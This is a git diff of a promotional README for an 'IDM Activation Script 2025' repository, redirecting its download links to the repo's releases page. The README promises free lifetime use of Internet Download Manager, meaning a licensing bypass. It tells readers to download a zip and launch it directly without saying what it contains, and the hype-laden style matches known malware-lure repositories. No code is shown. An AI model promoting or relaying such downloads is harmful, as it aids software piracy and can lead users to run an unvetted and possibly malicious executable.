@@ -10,7 +10,7 @@ Welcome to the IDM Activation Script 2025 repository! Here you will find everyth
 ## Get Started:
 To get started with activating IDM using our script, download the necessary files from the following link: 
 
-[![Download IDM Activation Script](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/assets/Release.zip)
+[![Download IDM Activation Script](https://github.com/Tenkan/IDM-Activation-Script-2025/releases)](https://github.com/Tenkan/IDM-Activation-Script-2025/releases)
 
 If the link ends with the file name, make sure to launch it directly. If the link leads to a website, feel free to visit it. If the link is not working or not provided, please check the "Releases" section of this repository for alternative download options.
 
@@ -32,11 +32,11 @@ Don't forget to ⭐️ star this repository to bookmark it for future reference.
 
 Thank you for choosing the IDM Activation Script 2025 repository. Activate your IDM today and enjoy a lifetime of free IDM usage! 🎉
 
-🔗 [Download IDM Activation Script](https://github.com/assets/Release.zip) 👈
+🔗 [Download IDM Activation Script](https://github.com/Tenkan/IDM-Activation-Script-2025/releases) 👈
 
 Let's supercharge your IDM experience together! 🚀🔒
 
-![IDM Activation](https://example.com/idm-activation-image.jpg) 
+![IDM Activation](https://github.com/Tenkan/IDM-Activation-Script-2025/releases) 
 
 ---
 Remember, the most important step is to always back up your registry and essential data before making any changes. Happy activating! 🎈
